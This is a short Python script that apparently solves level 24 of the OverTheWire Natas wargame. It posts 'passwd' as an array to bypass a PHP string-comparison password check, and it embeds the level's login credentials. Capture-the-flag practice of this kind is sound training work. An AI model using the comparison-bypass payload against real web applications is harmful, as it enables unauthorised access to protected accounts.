#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas24'
password = '0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = session.get(url, auth=(username, password))
response = session.post(url, data = { 'passwd[]' : 'shenal' }, auth=(username, password))


content = response.text
print(content)